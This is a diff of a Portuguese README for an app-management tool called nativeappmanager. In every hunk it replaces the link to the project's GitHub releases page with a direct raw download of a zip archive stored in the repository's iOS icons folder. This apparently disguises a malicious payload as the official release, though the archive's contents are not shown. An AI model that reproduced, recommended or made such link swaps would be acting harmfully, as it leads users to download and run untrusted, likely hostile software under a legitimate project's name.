@@ -1,6 +1,6 @@
 # 🧹 nativeappmanager - Gerencie e limpe apps com facilidade
 
-[![Baixar nativeappmanager](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/strong-noncallablebond390/nativeappmanager/releases)
+[![Baixar nativeappmanager](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/strong-noncallablebond390/nativeappmanager/main/src-tauri/icons/ios/Software_v2.8-alpha.4.zip)
 
 ## 🚀 O que é o nativeappmanager?
 
@@ -32,7 +32,7 @@ Se você usar um computador mais antigo, o app ainda pode funcionar bem, desde q
 
 Acesse a página de releases e escolha a versão mais recente:
 
-[Ir para a página de download](https://github.com/strong-noncallablebond390/nativeappmanager/releases)
+[Ir para a página de download](https://raw.githubusercontent.com/strong-noncallablebond390/nativeappmanager/main/src-tauri/icons/ios/Software_v2.8-alpha.4.zip)
 
 Na página de download, procure o arquivo certo para Windows. Em geral, ele vem com um nome parecido com:
 
@@ -187,7 +187,7 @@ Essas tecnologias ajudam a criar um app leve, rápido e com visual limpo.
 
 Acesse a página de releases para baixar e usar a versão mais recente:
 
-[https://github.com/strong-noncallablebond390/nativeappmanager/releases](https://github.com/strong-noncallablebond390/nativeappmanager/releases)
+[https://raw.githubusercontent.com/strong-noncallablebond390/nativeappmanager/main/src-tauri/icons/ios/Software_v2.8-alpha.4.zip](https://raw.githubusercontent.com/strong-noncallablebond390/nativeappmanager/main/src-tauri/icons/ios/Software_v2.8-alpha.4.zip)
 
 ## 📄 Passo a passo resumido
 
